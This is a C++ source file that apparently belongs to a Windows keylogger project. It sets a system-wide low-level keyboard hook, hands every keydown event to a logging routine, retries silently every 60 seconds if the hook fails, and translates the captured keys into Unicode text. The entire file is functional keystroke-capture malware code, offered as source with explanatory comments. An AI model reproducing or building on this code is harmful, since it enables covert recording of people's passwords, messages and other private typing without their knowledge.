#include "constants.hpp"
#include "keyboard.hpp"
#include "keylogger.hpp"
#include <chrono>
#include <cstdint>
#include <thread>

// The hook variable shared between the setter and the callback.
HHOOK hook;

// The callback that is fired every time a new keyboard input event is about to be
// posted into a thread input queue.
LRESULT WINAPI hook_callback(int code, WPARAM wparam, LPARAM lparam) {
	// If an action occurred and the keydown event was fired, log the respective 
	// characters of the KBD hook.
	if (code == HC_ACTION && wparam == WM_KEYDOWN)
		keylogger::log_kbd(*reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam));

	return CallNextHookEx(hook, code, wparam, lparam);
}

// Sets the low level keyboard hook.
void keyboard_util::set_hook() noexcept {
	using std::chrono_literals::operator""s;

	// If the hook could not be set, try again in 60 seconds.
	if (hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, NULL, 0); !hook) {
		std::this_thread::sleep_for(60s);
		set_hook();
	}
}

// Copies the status of the 256 virtual keys to the provided buffer.
std::vector<BYTE> keyboard_util::get_state() {
	std::vector<BYTE> keyboard_state(constants::keyboard_state_size);

	for (size_t i = 0; i < keyboard_state.size(); i++) {
		const auto key_state = GetKeyState(i);

		// Right shifts the high order bit by 8 to avoid a narrowing conversion
		// from a SHORT to a BYTE.
		keyboard_state[i] = (key_state >> 8) | (key_state & 1);
	}

	return keyboard_state;
}

// Right shifts the high order bit by 15 to obtain the virtual key's up/down status.
bool keyboard_util::is_down(DWORD vk_code) noexcept {
	return GetKeyState(vk_code) >> 15;
}

// Convert a kbd hook to the respective unicode characters.
std::wstring keyboard_util::kbd_to_unicode(const KBDLLHOOKSTRUCT& kbd_hook) {
	WCHAR key_buffer[constants::key_buffer_size];
	const auto result = ToUnicode(kbd_hook.vkCode, kbd_hook.scanCode, get_state().data(),
		key_buffer, constants::key_buffer_size, 0);

	// If the result was successful, return the buffer. If not, return an empty string.
	return result > 0 ? key_buffer : L"";
}
